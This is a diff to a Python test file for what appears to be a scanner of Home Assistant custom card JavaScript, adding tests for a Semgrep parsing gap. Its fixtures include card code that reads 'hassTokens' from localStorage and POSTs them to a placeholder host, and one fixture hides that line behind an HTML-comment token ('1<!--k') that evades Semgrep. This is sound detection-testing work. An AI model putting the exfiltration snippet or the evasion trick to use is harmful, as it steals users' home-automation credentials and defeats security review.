@@ -76,13 +76,52 @@ def test_token_stealer_in_lit_bundle_is_caught(tmp_path):
     assert "card-token-exfil" in _rules(r)
 
 
-def test_normalize_js_rewrites_lit_comment_regex(tmp_path):
-    # In context, lit-html's `/-->/g` made Semgrep 1.181 drop all of mushroom.js v5.2.3
-    # (0 matches, scan reported ok). The rewrite is the same regex, in our copy only.
+def test_normalize_js_rewrites_html_comment_tokens(tmp_path):
+    # Semgrep 1.181 treats `<!--` and `-->` as a line comment anywhere on a line. In
+    # context, lit-html's `/-->/g` made it drop all of mushroom.js v5.2.3 (0 matches,
+    # scan ok). Adding a space keeps code meaning and only pads strings/regexes.
     f = tmp_path / "b.js"
-    f.write_text('F=/<!--/g,G=/-->/g,K=/>/g;s="a-->b";\n')
+    f.write_text('F=/<!--/g,G=/-->/g;s="a-->b";x=a<!--b;while(n-->0);\n')
     assert normalize_js(tmp_path) == 1
-    assert f.read_text() == 'F=/<!--/g,G=/--[>]/g,K=/>/g;s="a-->b";\n'
+    assert f.read_text() == 'F=/< !--/g,G=/-- >/g;s="a-- >b";x=a< !--b;while(n-- >0);\n'
+
+
+def _card(tmp_path, name, js):
+    card = tmp_path / name
+    (card / "dist").mkdir(parents=True)
+    (card / "hacs.json").write_text(f'{{"name": "{name}", "filename": "{name}.js"}}')
+    (card / "dist" / f"{name}.js").write_text(js)
+    return card
+
+
+def test_html_comment_evasion_is_caught(tmp_path):
+    # At module scope, `<!--` hides the rest of the line from Semgrep 1.181 (0 results,
+    # 0 errors; inside functions it parses fine). In an ES module it is `1 < !(--k)`,
+    # so the fetch really runs.
+    card = _card(
+        tmp_path,
+        "comment-card",
+        'const k=localStorage.getItem("hassTokens");let z=1<!--k;fetch('
+        '"https://collect.invalid/c",{method:"POST",body:k});'
+        'class C extends HTMLElement{}customElements.define("comment-card",C);\n',
+    )
+    r = scan(str(card), offline=True)
+    assert {"card-token-exfil", "card-html-comment-token"} <= _rules(r)
+    assert r.score.verdict.key == "bork"
+
+
+def test_arrow_comment_idiom_does_not_hide_code(tmp_path):
+    # `n-->0` is an ordinary minified idiom (n-- > 0), not a trick: the hidden fetch is
+    # found, and no evasion finding is raised for it.
+    card = _card(
+        tmp_path,
+        "arrow-card",
+        'let n=3,k=localStorage.getItem("hassTokens");n-->0&&fetch('
+        '"https://collect.invalid/c",{method:"POST",body:k});\n',
+    )
+    rules = _rules(scan(str(card), offline=True))
+    assert "card-token-exfil" in rules
+    assert "card-html-comment-token" not in rules
 
 
 def test_unparseable_js_is_reported_not_silent(tmp_path):
